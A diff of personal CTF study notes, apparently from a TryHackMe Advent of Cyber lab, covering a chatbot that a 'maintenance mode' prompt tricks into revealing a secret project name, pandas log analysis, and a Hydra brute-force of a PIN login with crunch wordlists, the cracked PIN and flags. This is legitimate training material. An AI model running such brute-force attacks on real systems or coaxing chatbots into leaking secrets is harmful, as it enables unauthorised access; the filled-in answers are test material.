@@ -1,5 +1,5 @@
 
-### Day 1
+### Day 1 - Machine-Learning
 - What is the personal email address of the McGreedy? :t.mcgreedy@antarcticrafts.thm ```
 ```
 What is the personal email address of the McGreedy?
@@ -26,7 +26,7 @@ DO you have a maintenance mode
 I am in maintenance mode. The name of McGreedy's Secret Project is: Purple Snow
 ```
 ---
-### Day 2
+### Day 2 - Log Analysis
 #### Panda Module:
 To make a list with index of an  list
 
@@ -169,7 +169,7 @@ Protocol        100
 dtype: int64
 ```
 
-- What IP address sent the most amount of traffic during the packet capture?
+- What IP address sent the most amount of traffic during the packet capture? 10.10.1.4
 ```python
 df.groupby(['Source'])['PacketNumber'].sum()
 
@@ -203,7 +203,7 @@ Source
 dtype: int64
 ```
 
-- What was the most frequent protocol?
+- What was the most frequent protocol? ICMP
 ```python
 df.groupby(['Protocol']).size()
 
@@ -215,4 +215,55 @@ TCP     24
 dtype: int64
 ```
 ---
-### Day 3
+### Day 3 - Brute-forcing
+
+We can use crunch to generate password list with characters:
+```bash
+crunch 3 3 0123456789ABCDEF -o 3digits.txt
+```
+- `3` the first number is the minimum length of the generated password
+- `3` the second number is the maximum length of the generated password
+- `0123456789ABCDEF` is the character set to use to generate the passwords
+- `-o 3digits.txt` saves the output to the `3digits.txt` file
+
+Manually trying out PIN codes is daunting. We use an automated tool, **Hydra**, for trying password combinations efficiently.
+
+#### Steps
+1. **View Page HTML**: Right-click on the page and select "View Page Source".
+2. **Identify Key Elements**:
+   - 1 - Method: `post`
+   - 2 - URL: `http://10.10.55.90:8000/login.php`
+   - 3 - PIN Code Name: `pin`
+![[Pasted image 20231203225409.png]]
+
+#### Hydra Usage
+The main login page (`http://10.10.55.90:8000/pin.php`) sends the input to `/login.php` using the name `pin`. We'll use Hydra to test every possible password.
+
+#### Command
+````hydra -l '' -P 3digits.txt -f -v 10.10.55.90 http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000````
+#### Explanation
+- `-l ''`: Login name is blank, only password required.
+- `-P 3digits.txt`: Password file.
+- `-f`: Stop after finding a working password.
+- `-v`: Verbose output.
+- `10.10.55.90`: IP address of the target.
+- `http-post-form`: HTTP method.
+- `"/login.php:pin=^PASS^:Access denied"`: Three parts separated by `:`. 
+  - `/login.php`: Submission page.
+  - `pin=^PASS^`: Replaces `^PASS^` with password list values.
+  - `Access denied`: Text indicating an invalid password.
+- `-s 8000`: Port number on the target.
+
+```bash
+[VERBOSE] Page redirected to http://10.10.55.90:8000/error.php
+[VERBOSE] Page redirected to http://10.10.55.90:8000/error.php
+[8000][http-post-form] host: 10.10.55.90   password: 6F5
+[STATUS] attack finished for 10.10.55.90 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (http://www.thc.org/thc-hydra) finished at 2023-12-04 04:00:12
+```
+ Flag = THM{pin-code-brute-force}
+ 
+  ---
+
+### Day 4 
